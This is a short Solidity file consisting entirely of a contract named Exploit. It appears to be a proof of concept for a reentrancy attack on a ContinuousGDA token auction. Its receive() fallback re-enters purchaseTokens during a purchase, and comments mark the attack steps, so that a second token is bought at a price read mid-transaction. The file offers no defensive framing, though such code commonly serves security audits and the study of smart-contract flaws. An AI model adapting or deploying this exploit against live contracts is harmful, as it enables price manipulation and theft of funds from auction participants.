// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;
import "./ContinuousGDA.sol";

contract Exploit {
    bool attack;
    address target;
    uint256 s_firstPrice;
    uint256 s_secondPrice;

    function anticipatedPurchase(address _gda, uint qty) external returns (uint256 firstPrice, uint256 secondPrice) {
        attack = false;
        firstPrice = ContinuousGDA(_gda).purchasePrice(qty);
        ContinuousGDA(_gda).purchaseTokens{value: firstPrice}(qty, address(this));

        secondPrice = ContinuousGDA(_gda).purchasePrice(qty);
        ContinuousGDA(_gda).purchaseTokens{value: secondPrice}(qty, address(this));
    }    

    function maliciousPurchase(address _gda) external returns (uint, uint) {
        attack = true;
        target = _gda;
        s_firstPrice = ContinuousGDA(_gda).purchasePrice(1);
        // Step 1; 
        // We reenter in the receive function next.
        ContinuousGDA(_gda).purchaseTokens{value: s_firstPrice}(1, address(this));
        return (s_firstPrice, s_secondPrice);
    }
    
    // Step 2;
    receive() external payable {
        if (attack) {
            attack = false;
            s_secondPrice = ContinuousGDA(target).purchasePrice(1);
            ContinuousGDA(target).purchaseTokens{value: s_secondPrice}(1, address(this));
        }
    }
}
